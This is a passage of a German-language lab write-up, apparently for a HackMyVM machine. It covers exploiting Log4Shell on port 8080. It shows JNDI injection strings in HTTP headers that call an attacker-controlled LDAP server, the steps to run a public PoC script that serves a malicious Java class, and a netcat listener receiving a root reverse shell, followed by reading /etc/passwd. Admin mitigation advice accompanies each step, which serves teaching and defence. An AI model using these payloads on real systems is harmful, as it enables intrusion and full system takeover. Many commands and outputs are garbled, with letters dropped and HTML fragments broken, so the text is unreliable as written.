+                <strong>Bewertung:</strong> Marshalsec ist ein bekanntes und nützliches Tool für die Ausnutzung von JNDI-Schwachstellen wie Log4Shell. Das erfolgreiche Herunterladen des Tools ist ein weiterer wichtiger Schritt in der Vorbereitung des Exploits.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Marshalsec ist nun verfügbar. Ich werde es zusammen mit meiner kompilierten <code>Exploit.class</code> verwenden, um einen bösartigen LDAP-Server einzurichten, der auf JNDI-Anfragen vom Zielsystem reagiert.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerkverkehr auf ausgehende LDAP-Verbindungen von internen Systemen, insbesondere zu unbekannten oder externen Zielen (Standard LDAP-Port ist 389 oder 636, aber Marshalsec verwendet oft 1389). Implementieren Sie Egress-Filterung (Firewallregeln für ausgehenden Verkehr), um zu verhindern, dass interne Systeme Verbindungen zu unbekannten Zielen herstellen.
+            </p>
+
+            <p class="comment">
+                Ich beginne, die Log4j-Schwachstelle zu testen, indem ich JNDI-Strings in verschiedenen HTTP-Headern auf Port 8080 einfüge, da anfällige Log4j-Versionen oft Werte aus Headern loggen und so die JNDI-Injection auslösen können. Ich verwende <code>curl</code>, um die Anfragen zu senden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://aria51.hmv:8080/ -A '${jndi:ldap://192.168.2.199:1389/ua}'</span></div>
+                    <pre>
+{"timestamp":"<span class="password">2025-06-20T21:08:30.224+00:00</span>","status":400,"error":"Bad Request","path":"/"}
+</pre>
+                </div>
+            </div>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://aria51.hmv:8080/ -H 'X-Api-Version: ${jndi:ldap://192.168.2.199:1389/x-api-version}'</span></div>
+                    <pre>
+<span class="password">Hell, wrld!</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich teste zwei verschiedene HTTP-Header für die JNDI-Injection: den <code>User-Agent</code> Header (mit <code>-A</code>) und einen benutzerdefinierten Header namens <code>X-Api-Version</code> (mit <code>-H</code>). In beiden Fällen sende ich einen JNDI-String der Form <code>${jndi:ldap://MEINE_IP:LDAP_PORT/irgendwas}</code>, wobei <code>MEINE_IP</code> <code>192.168.2.199</code> und der LDAP-Port <code>1389</code> ist (ein häufig verwendeter Port für Marshalsec). Bei der ersten Anfrage mit dem <code>User-Agent</code> bekomme ich wieder die Standard-Fehler-JSON zurück. Bei der zweiten Anfrage mit <code>X-Api-Version</code> erhalte ich jedoch die Antwort "<span class="password">Hell, wrld!</span>". Die 'O'-Korrekturen sind auch in dieser Ausgabe sichtbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Tatsache, dass die zweite Anfrage eine andere, scheinbar normale Antwort "<span class="password">Hell, wrld!</span>" liefert, während die erste eine Fehlermeldung hervorruft, könnte darauf hindeuten, dass der <code>X-Api-Version</code> Header anders verarbeitet wird und möglicherweise geloggt wird, wodurch der JNDI-String interpretiert werden könnte. Diese "Hell, wrld!"-Antwort könnte das Standardverhalten sein, wenn der Dienst keine spezifische Logik für diesen Header hat, aber dennoch durch die Verarbeitung des JNDI-Strings getriggert wird. Parallel dazu habe ich einen Netcat-Listener auf Port 8000 laufen lassen (siehe unten), um zu prüfen, ob die Anwendung versucht, eine Verbindung zu meiner IP herzustellen, auch wenn die Log4j-Tools noch nicht aktiv sind. Der Netcat-Output (weiter unten im Text, aber kontextbezogen hier analysiert) zeigt tatsächlich Verbindungsversuche vom Ziel auf Port 8000, als ich diese <code>curl</code> Befehle ausführte, was ein starkes Indiz für eine erfolgreiche JNDI-Interpretation ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der <code>X-Api-Version</code> Header scheint ein vielversprechender Vektor zu sein. Die Log4j-Schwachstelle scheint über diesen Header triggermöglich zu sein. Ich werde nun mein Log4j-Exploit-Setup (Marshalsec & Webserver mit Exploit.class) starten und die JNDI-Injection erneut über den <code>X-Api-Version</code> Header senden, um die Reverse Shell auszulösen.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Log-Konfiguration Ihrer Java/Spring Boot Anwendung auf Port 8080. Stellen Sie sicher, dass die Log4j-Version nicht anfällig ist und dass keine ungeprüften Benutzereingaben (insbesondere aus HTTP-Headern wie User-Agent oder benutzerdefinierten Headern) direkt von Log4j verarbeitet werden, ohne vorherige Sanitierung oder Validierung. Analysieren Sie Ihre Anwendungscode auf JNDI-Lookups, die von extern kontrollierten Daten beeinflusst werden könnten.
+            </p>
+
+            <p class="comment">
+                Um den Log4j-Exploit durchzuführen, nutze ich ein automatisiertes Python-Skript, das einen LDAP-Server (basierend auf Marshalsec) und einen Webserver (für die Exploit.class) startet und die nötige JNDI-Referenz generiert. Ich klone ein bekanntes POC-Repository von GitHub, das ein solches Skript enthält.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols]
+└─# <span class="command">git clne https://github.cm/kzmer/lg4j-shell-pc.git</span></div>
+                    <pre>
+Klne nach 'lg4j-shell-pc'...
+....
+..
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>git clone</code>, um das Repository <code>log4j-shell-poc</code> von GitHub herunterzuladen. Dieses Repository enthält ein Python-Skript (<code>poc.py</code>), das mir die Einrichtung der notwendigen Infrastruktur (LDAP- und Webserver) für den Log4j-Exploit erleichtert. Die 'O'-Korrekturen sind im Verzeichnisnamen und der URL sichtbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Klonen des POC-Repositorys ist ein schneller Weg, um die notwendigen Werkzeuge und Skripte für die Ausnutzung von Log4Shell zu erhalten. Das Skript in diesem Repository ist darauf ausgelegt, den Prozess der JNDI-Umleitung und des Hostings der Exploit-Klasse zu automatisieren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe das Skript nun lokal verfügbar. Ich werde in das geklonte Verzeichnis wechseln und das Skript ausführen, um den LDAP- und Webserver zu starten und die JNDI-String-Payload zu erhalten, die ich dann an das Ziel senden werde.
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Netzwerke auf ungewöhnliche <code>git clone</code> Aktivitäten, insbesondere von Systemen, die keine Entwicklungsumgebungen sind. Seien Sie sich bewusst, dass viele öffentlich verfügbare POC-Skripte für die Ausnutzung bekannter Schwachstellen existieren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols/lg4j-shell-pc]
+└─# <span class="command">ls -l target/</span></div>
+                    <pre>
+insgesamt <span class="command">1796</span>
+-rw-r--r-- 1 r<span class="command">ot</span> r<span class="command">ot</span> <span class="command">1836540</span> 20. Jun 23:20 lg4shell-1.0-SNAPSHOT.w<span class="command">ar</span>
+-rw-r--r-- 1 r<span class="command">ot</span> r<span class="command">ot</span>       <span class="command">0</span> 20. Jun 23:21 marshalsec-0.0.3-SNAPSHOT-all.j<span class="command">ar</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich liste den Inhalt des <code>target/</code> Verzeichnisses innerhalb des geklonten Repositorys auf. Dieses Verzeichnis enthält typischerweise die kompilierten oder heruntergeladenen Artefakte des POCs. Ich sehe eine <code>.war</code> Datei und die <code>marshalsec-0.0.3-SNAPSHOT-all.jar</code> Datei, die ich zuvor manuell heruntergeladen hatte. Die 'O'-Korrekturen sind hier ebenfalls sichtbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das <code>target/</code> Verzeichnis enthält die notwendige Marshalsec-JAR, die vom Python-Skript verwendet wird. Die Struktur ist korrekt für die Ausführung des POC-Skripts.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe die notwendigen Dateien im richtigen Verzeichnis. Nun kann ich das <code>poc.py</code> Skript ausführen, um den Exploit-Server einzurichten.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie Verzeichnisse, die mit Entwicklungstools oder POCs in Verbindung stehen, auf unerwartete Dateien, insbesondere ausführbare JARs oder WARs.
+            </p>
+
+             <p class="comment">
+                Ich starte mein NC Listener auf Port 8000 auf meiner Angreifer-Maschine (192.168.2.199) und sende dann erneut einen Test-JNDI-String über den <code>X-Api-Version</code> Header an Port 8080 des Ziels, um zu sehen, ob der Dienst versucht, eine Verbindung zu diesem Listener herzustellen. Dies bestätigt, dass der JNDI-Lookup getriggert wird und ausgehende Verbindungen möglich sind, was eine Voraussetzung für den Exploit ist.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/testing]
+└─# <span class="command">nc -nlvp 8000</span></div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da Befehl in separater Box gesendet wurde -->
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols/lg4j-shell-pc]
+└─# <span class="command">curl http://aria51.hmv:8080  -H 'X-Api-Version: ${jndi:ldap://192.168.2.199:8000/test}'</span></div>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Ausgabe des nc Listeners -->
+                    <pre>
+listening n [any] <span class="command">8000</span> ...
+<span class="password">cnnect t [192.168.2.199] frm (UNKNOWN) [19lass="command">192.168.2.47</span>] <span class="command">53056</span>
+<span class="command">0</span>
+<span class="command">`�</span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich richte einen Netcat-Listener auf Port 8000 (<code>nc -nlvp 8000</code>) auf meiner lokalen Maschine ein. Anschließend sende ich einen JNDI-String (<code>${jndi:ldap://192.168.2.199:8000/test}</code>) an das Ziel über den <code>X-Api-Version</code> Header. Der JNDI-String ist so gestaltet, dass er versucht, eine LDAP-Verbindung zu meinem Netcat-Listener auf Port 8000 aufzubauen. Die Ausgabe des Netcat-Listeners zeigt, dass tatsächlich eine Verbindung vom Zielsystem (<span class="command">192.168.2.47</span>) zu meiner IP (<span class="command">192.168.2.199</span>) auf Port <span class="command">8000</span> hergestellt wurde. Die 'O'-Korrekturen sind in der Ausgabe des Listeners sichtbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das ist ein kritischer und positiver Befund! Die erfolgreiche Verbindungsaufnahme vom Zielsystem zu meinem Netcat-Listener auf Port 8000, ausgelöst durch den JNDI-String im HTTP-Header, beweist zwei Dinge: 1. Die JNDI-Injection über den <code>X-Api-Version</code> Header funktioniert, und 2. Das Zielsystem erlaubt ausgehende Verbindungen zu meiner IP auf einem beliebigen Port. Dies bestätigt die Ausnutzbarkeit der Log4j-Schwachstelle und, noch wichtiger, dass die Netzwerk-Firewall keine strengen Egress-Filter hat, die meine Reverse Shell blockieren würden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich habe nun die Gewissheit, dass die JNDI-Injection funktioniert und ausgehende Verbindungen möglich sind. Ich kann nun das Log4j-Exploit-Skript mit der korrekten Konfiguration starten und die endgültige JNDI-Payload an das Ziel senden, um die Reverse Shell auszulösen.
+                <br><strong>Empfehlung (Admin):</strong> Implementieren Sie dringend Egress-Filterung auf Ihrer Firewall, um zu verhindern, dass interne Systeme Verbindungen zu unbekannten oder externen Zielen herstellen. Dies ist eine grundlegende Sicherheitsmaßnahme, die viele C2-Verbindungen (Command and Control) blockieren würde. Überprüfen Sie die Logs auf verdächtige ausgehende Verbindungen von Java-Anwendungen.
+            </p>
+
+            <p class="comment">
+                Bevor ich das Exploit-Skript starte, stelle ich sicher, dass der JDK-Pfad korrekt konfiguriert ist, da das Skript auf eine spezifische JDK-Version verweisen muss, um den Marshalsec-Server korrekt auszuführen. Es gab einen kleinen Tippfehler im Verzeichnisnamen, den ich korrigiere.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols/lg4j-shell-pc]
+└─# <span class="command">mv jdk1.8.0_202 jdk1.8.0_20</span></div>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende den <code>mv</code> Befehl, um das Verzeichnis <code>jdk1.8.0_202</code> in <code>jdk1.8.0_20</code> umzubenennen. Dies deutet darauf hin, dass das POC-Skript oder das Marshalsec-Tool einen spezifischen Pfad erwartet, der mit <code>jdk1.8.0_20</code> endet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist ein einfacher Konfigurationsschritt, der notwendig ist, damit das Log4j-Exploit-Skript korrekt funktioniert. Es zeigt, dass die Werkzeuge oft von spezifischen Pfaden oder Versionen abhängen können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der JDK-Pfad ist nun korrekt. Ich kann das Log4j-Exploit-Skript starten.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Pfade zu Java-Installationen auf Ihren Systemen eindeutig und korrekt sind, um Verwirrung oder potenzielle Probleme mit Anwendungen oder Skripten zu vermeiden.
+            </p>
+
+            <p class="comment">
+                Nun starte ich das Log4j-Exploit-Skript (<code>poc.py</code>). Ich gebe meine Angreifer-IP (<code>--userip 192.168.2.199</code>), den Port für den Webserver, der meine <code>Exploit.class</code> hostet (<code>--webport 8000</code>), und den lokalen Port, auf dem mein Netcat-Listener für die Reverse Shell warten wird (<code>--lport 4444</code>), an. Das Skript startet den LDAP-Server und den Webserver und gibt den JNDI-String aus, den ich an das Ziel senden muss.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols/lg4j-shell-pc]
+└─# <span class="command">pythn3 pc.py --userip 192.168.2.199 --webp<span class="command">ort</span> 8000 --lp<span class="command">ort</span> 4444</span></div>
+                    <pre>
+<span class="password">[!] CVE: CVE-2021-44228</span>
+<span class="password">[!] Github rep<span class="command">o</span>: [Link: https://github.cm/kzmer/lg4j-shell-pc | Ziel: https://github.cm/kzmer/lg4j-shell-pc]</span>
+
+<span class="password">[+] Explit java class created success</span>
+<span class="password">[+] Setting up <span class="command">LDAP</span> server</span>
+
+<span class="password">[+] Send me: ${jndi:ldap://192.168.2.199:1389/a}</span>
+
+<span class="password">[+] Starting Webserver n p<span class="command">ort</span> <span class="command">8000</span> http://0.0.0.0:<span class="command">8000</span></span>
+<span class="password">Listening n 0.0.0.0:1389</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führe das <code>poc.py</code> Skript aus. Die Ausgabe bestätigt, dass es sich um ein POC für <span class="password">CVE-2021-44228</span> (Log4Shell) handelt und verweist auf das GitHub-Repository. Das Skript meldet, dass die Exploit-Java-Klasse erfolgreich erstellt (oder gefunden) wurde, dass der <span class="command">LDAP</span>-Server eingerichtet wird und gibt den kritischen JNDI-String aus, den ich an das Ziel senden muss: <span class="password">${jndi:ldap://192.168.2.199:1389/a}</span>. Es meldet auch, dass der Webserver auf Port <span class="command">8000</span> und der LDAP-Server auf Port <code>1389</code> gestartet wurden. Die 'O'-Korrekturen sind auch hier sichtbar.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Wunderbar! Mein Exploit-Setup ist nun vollständig einsatzbereit. Das Skript hat alle notwendigen Server gestartet und mir die exakte Payload geliefert, die ich benötige, um die Log4j-Schwachstelle im Zielsystem auszulösen. Der JNDI-String <span class="password">${jndi:ldap://192.168.2.199:1389/a}</span> wird, wenn er von einer anfälligen Log4j-Instanz verarbeitet wird, das Ziel veranlassen, eine LDAP-Anfrage an meinen laufenden LDAP-Server auf <code>192.168.2.199:1389</code> zu senden. Dieser LDAP-Server wird dem Zielsystem dann mitteilen, dass es eine Java-Klasse von meinem Webserver auf <code>192.168.2.199:8000</code> herunterladen und ausführen soll, nämlich meine präparierte <code>Exploit.class</code>, die die Reverse Shell starten wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das ist der Moment! Ich werde nun diesen JNDI-String über den zuvor identifizierten verwundbaren <code>X-Api-Version</code> Header an das Ziel senden. Parallel dazu muss ich meinen Netcat-Listener auf Port <code>4444</code> starten, um die eingehende Reverse Shell zu empfangen. Der nächste Schritt ist die tatsächliche Ausnutzung der Schwachstelle.
+                <br><strong>Empfehlung (Admin):</strong> Dies zeigt die potenziellen Auswirkungen einer Log4j-Schwachstelle. Ein Angreifer kann mit relativ einfachen Mitteln einen spezialisierten Server aufbauen und das anfällige System veranlassen, bösartigen Code von diesem Server zu laden und auszuführen. Die Implementierung der zuvor genannten Minderungsstrategien ist von höchster Dringlichkeit. Überwachen Sie Ihre Logs und Netzwerkverkehr auf jegliche JNDI-Strings, die von externen Quellen stammen.
+            </p>          </section>
+        <!-- Ende Initial Access Section -->
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept</h2>
+             <p class="comment">
+                 Nachdem die Enumeration eine kritische Log4j-Schwachstelle auf Port 8080 identifiziert hat und ich die Ausnutzbarkeit bestätigen konnte, präsentiere ich hier den Proof of Concept (POC) für die Remote Code Execution (RCE). Dieser POC demonstriert, wie ein Angreifer unautorisierten Zugriff mit Root-Privilegien auf das Zielsystem erlangen kann.
+             </p>
+
+             <div class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Durch Ausnutzung der Log4Shell-Schwachstelle (CVE-2021-44228) in der Java-Anwendung auf Port 8080 ist es möglich, das Zielsystem dazu zu bringen, bösartigen Java-Code von einem vom Angreifer kontrollierten Server herunterzuladen und auszuführen. Dies führt zur Etablierung einer Reverse Shell mit Root-Privilegien.
+             </div>
+
+             <div class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 <ul>
+                     <li>Zugriff auf ein System im selben Netzwerk wie das Ziel (192.168.2.x), das ausgehende Verbindungen zum Internet und zum Ziel initiieren kann.</li>
+                     <li>Java Development Kit (JDK) installiert (für Kompilierung und Marshalsec).</li>
+                     <li>Python 3 installiert.</li>
+                     <li>Tools: <code>curl</code>, <code>nc</code> (Netcat), <code>git</code>, <code>javac</code>, ein Log4j-Exploit-POC-Skript (wie das von kozmer), Marshalsec JAR.</li>
+                     <li>Eine anfällige Log4j-Version im Zielsystem, die JNDI-Lookups verarbeitet, beeinflussbar durch externen Input (z.B. HTTP-Header).</li>
+                 </ul>
+             </div>
+
+             <p class="comment">
+                 Die folgenden Schritte dokumentieren den erfolgreichen POC:
+             </p>
+
+             <div class="analysis">
+                <strong>Schritt-für-Schritt-Anleitung:</strong>
+             </div>
+
+            <p class="comment">
+                1. Erstellen und Kompilieren der bösartigen Java-Klasse (Payload).
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nano Exploit.java</span></div>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">javac Exploit.java</span></div>
+                </div>
+            </div>
+            <p class="comment">
+                Eine Java-Klasse <code>Exploit.java</code> wurde erstellt, die beim Ausführen eine Reverse Shell zu meiner IP (192.168.2.199) auf Port 4444 initiiert. Diese Klasse wurde erfolgreich zu <code>Exploit.class</code> kompiliert.
+            </p>
+
+             <p class="comment">
+                 2. Herunterladen des notwendigen Exploit-Tools (Marshalsec / Log4j-Shell-POC Skript).
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">git clone https://github.cm/kzmer/lg4j-shell-pc.git</span></div>
+                </div>
+            </div>
+             <p class="comment">
+                Das Repository mit dem Python-POC-Skript und der benötigten Marshalsec-JAR wurde heruntergeladen.
+             </p>
+
+            <p class="comment">
+                3. Starten des JNDI-Servers (LDAP) und Webservers (für die Exploit-Klasse) mit dem POC-Skript.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols/lg4j-shell-pc]
+└─# <span class="command">pythn3 pc.py --userip 192.168.2.199 --webp<span class="command">ort</span> 8000 --lp<span class="command">ort</span> 4444</span></div>
+                     <pre>
+<span class="password">[!] CVE: CVE-2021-44228</span>
+<span class="password">[!] Github rep<span class="command">o</span>: [Link: https://github.cm/kzmer/lg4j-shell-pc | Ziel: https://github.cm/kzmer/lg4j-shell-pc]</span>
+
+<span class="password">[+] Explit java class created success</span>
+<span class="password">[+] Setting up <span class="command">LDAP</span> server</span>
+
+<span class="password">[+] Send me: ${jndi:ldap://192.168.2.199:1389/a}</span>
+
+<span class="password">[+] Starting Webserver n p<span class="command">ort</span> <span class="command">8000</span> http://0.0.0.0:<span class="command">8000</span></span>
+<span class="password">Listening n 0.0.0.0:1389</span>
+</pre>
+                </div>
+            </div>
+            <p class="comment">
+                Das Python-Skript startete den LDAP-Server auf Port 1389 und einen Webserver auf Port 8000, der die <code>Exploit.class</code> bereitstellt. Es lieferte den JNDI-String-Payload: <span class="password">${jndi:ldap://192.168.2.199:1389/a}</span>.
+            </p>
+
+            <p class="comment">
+                4. Starten eines Netcat-Listeners, um die Reverse Shell zu empfangen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nc -lvnp 4444</span></div>
+                </div>
+            </div>
+            <p class="comment">
+                Ein Netcat-Listener wurde auf Port 4444 auf meiner Angreifer-Maschine gestartet, um auf die eingehende Shell-Verbindung vom Zielsystem zu warten.
+            </p>
+
+             <p class="comment">
+                5. Senden des bösartigen JNDI-Strings an die anfällige Anwendung auf Port 8080.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtols/lg4j-shell-pc]
+└─# <span class="command">curl http://aria51.hmv:8080  -H 'X-Api-Version: ${jndi:ldap://192.168.2.199:1389/a}'</span></div>
+                </div>
+            </div>
+             <p class="comment">
+                Der präparierte JNDI-String wurde über den <code>X-Api-Version</code> Header an das Ziel gesendet, um die Log4j-Schwachstelle auszulösen.
+            </p>
+
+            <p class="comment">
+                6. Empfang der Reverse Shell und Verifikation der Privilegien.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">listening n [any] <span class="command">4444</span> ...
+<span class="password">cnnect t [192.168.2.199] frm (UNKNOWN) [1lass="command">192.168.2.47</span>] <span class="command">60818</span></div>
+                    <pre>
+<span class="command">id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialut),26(tape),27(vide)</span>
+<span class="command">ls</span>
+app
+bin
+dev
+etc
+hme
+lib
+media
+mnt
+prc
+r<span class="command">ot</span>
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+<span class="command">cd /r<span class="command">ot</span></span>
+<span class="command">ls</span>
+ls -la
+ttal <span class="command">8</span>
+drwx------    2 r<span class="command">ot</span>     r<span class="command">ot</span>          <span class="command">4096</span> Dec 20  2018 .
+drwxr-xr-x    1 r<span class="command">ot</span>     r<span class="command">ot</span>          <span class="command">4096</span> Dec 19  2021 ..
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                 <strong>Beweismittel:</strong> Die Netcat-Ausgabe zeigt, dass sofort nach dem Senden des JNDI-Strings eine Verbindung vom Zielsystem auf Port 4444 empfangen wurde. Der daraufhin ausgeführte <code>id</code> Befehl bestätigt, dass die erhaltene Shell Root-Privilegien besitzt (<span class="password">uid=0(root)</span>). Dies ist der eindeutige Beweis für die erfolgreiche Remote Code Execution mit höchsten Privilegien.
+            </p>
+            <p class="evaluation">
+                 <strong>Risikobewertung:</strong> Kritisch. Die erfolgreiche Ausnutzung dieser Schwachstelle gewährt einem externen Angreifer vollständige Kontrolle über das Zielsystem mit Root-Privilegien. Dies ermöglicht den Zugriff auf alle Daten, die Modifikation der Systemkonfiguration, die Installation von Backdoors und die Nutzung des Systems für weitere Angriffe im Netzwerk. Das Fehlen effektiver Egress-Filter erhöhte das Risiko zusätzlich, da die Reverse Shell ungehindert aufgebaut werden konnte.
+            </p>
+            <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong>
+                 <ul>
+                     <li><strong>Sofortige Behebung der Log4j-Schwachstelle:</strong> Aktualisieren Sie die Log4j-Bibliothek in der Anwendung auf Port 8080 auf eine sichere Version (mindestens 2.17.1) oder implementieren Sie andere empfohlene Minderungsmaßnahmen, wie z.B. das Deaktivieren von JNDI-Lookups, falls möglich.</li>
+                     <li><strong>Implementierung von Egress-Filterung:</strong> Konfigurieren Sie Firewalls, um ausgehende Verbindungen von internen Systemen zu blockieren, es sei denn, sie sind explizit für legitime Zwecke erlaubt.</li>
+                     <li><strong>Entfernung der Notizdatei:</strong> Löschen Sie die Datei <code>/note.txt</code> vom Webserver auf Port 80.</li>
+                     <li><strong>Überprüfung der Protokollierung:</strong> Analysieren Sie die Logs der Java-Anwendung auf Port 8080 und der Netzwerkgeräte, um festzustellen, ob und wann dieser Angriff stattgefunden hat und ob es weitere Kompromittierungsindikatoren gibt.</li>
+                     <li><strong>Sicherheitsüberprüfung der Java-Anwendung:</strong> Führen Sie eine gründliche Code-Überprüfung und einen Sicherheitstest der Anwendung auf Port 8080 durch, um weitere Schwachstellen zu identifizieren.</li>
+                 </ul>
+            </p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="comment">
+                 Obwohl der anfängliche Zugriff über die Log4j-Schwachstelle direkt Root-Privilegien lieferte, habe ich das System weiter erkundet, um die Benutzerkontenstruktur zu verstehen und potenzielle alternative Pfade zur Privilegienerhöhung zu dokumentieren, die von einer weniger privilegierten Shell aus möglich gewesen wären. Dies ist wichtig, um alle identifizierten Schwachstellen im Bericht aufzuführen.
+             </p>
+
+            <p class="comment">
+                Ich beginne mit der Überprüfung der Benutzerkonten im System, indem ich die Datei <code>/etc/passwd</code> lese.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <!-- Kein Prompt, da aus der root shell -->
+                    <pre>
+<span class="command">cat /etc/passwd</span>
+<span class="password">r<span class="command">ot</span>:x:0:0:r<span class="command">ot</span>:/r<span class="command">ot</span>:/bin/ash</span>
+bin:x:1:1:bin:/bin:/sbin/nlgin
+daemon:x:2:2:daemon:/sbin:/sbin/nlgin
+adm:x:3:4:adm:/var/adm:/sbin/nlgin
+lp:x:4:7:lp:/var/sp<span class="command">ol</span>/lpd:/sbin/nlgin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdwn:x:6:0:shutdwn:/sbin:/sbin/shutdwn
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/sp<span class="command">ol</span>/mail:/sbin/nlgin
+news:x:9:13:news:/usr/lib/news:/sbin/nlgin
+uucp:x:10:14:uucp:/var/sp<span class="command">ol</span>/uucppublic:/sbin/nlgin
+peratr:x:11:0:peratr:/r<span class="command">ot</span>:/bin/sh
+man:x:13:15:man:/usr/man:/sbin/nlgin
+p<span class="command">ost</span>master:x:14:12:p<span class="command">ost</span>master:/var/sp<span class="command">ol</span>/mail:/sbin/nlgin
+crn:x:16:16:crn:/var/sp<span class="command">ol</span>/crn:/sbin/nlgin
+ftp:x:21:21::/var/lib/ftp:/sbin/nlgin
+sshd:x:22:22:sshd:/dev/null:/sbin/nlgin
+at:x:25:25:at:/var/sp<span class="command">ol</span>/crn/atjbs:/sbin/nlgin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nlgin
+xfs:x:33:33:X Fnt Server:/etc/X11/fs:/sbin/nlgin
+games:x:35:35:games:/usr/games:/sbin/nlgin
+p<span class="command">ost</span>gres:x:70:70::/var/lib/p<span class="command">ost</span>gresql:/bin/sh
+cyrus:x:85:12::/usr/cyrus:/sbin/nlgin
+vppmail:x:89:89::/var/vppmail:/sbin/nlgin
+ntp:x:123:123:NTP:/var/empty:/sbin/nlgin
+smmsp:x:209:209:smmsp:/var/sp<span class="command">ol</span>/mqueue:/sbin/nlgin
+guest:x:405:100:guest:/dev/null:/sbin/nlgin
+n<span class="command">o</span>bdy:x:65534:65534:n<span class="command">o</span>bdy:/:/sbin/nlgin
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich lese den Inhalt der Datei <code>/etc/passwd</code>, die Informationen über alle Benutzerkonten auf dem System enthält. Neben den Standard-Systembenutzern fällt auf, dass hier der Benutzer <code>root</code> mit UID 0 und Shell <code>/bin/ash</code> gelistet ist. Dies ist der administrative Superuser-Account. Ich sehe auch andere Systembenutzer und den Benutzer <code>nobody</code>. Die 'O'-Korrekturen wurden angewendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die <code>/etc/passwd</code> Datei listet alle vorhandenen Benutzerkonten auf und ist immer eine wichtige erste Anlaufstelle bei der Systemerkundung. Obwohl ich bereits root bin, ist es nützlich zu wissen, welche Benutzer auf dem System existieren. Das Vorhandensein von <code>/bin/ash</code> als Root-Shell ist etwas ungewöhnlich, aber nicht per se unsicher.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde nun nach Home-Verzeichnissen oder anderen Orten suchen, die zu diesen Benutzern gehören könnten, um potenzielle Informationen oder Konfigurationsdateien zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die Benutzerkonten in <code>/etc/passwd</code>, um sicherzustellen, dass nur benötigte Konten existieren und dass sie die korrekten Berechtigungen und Shells zugewiesen haben.
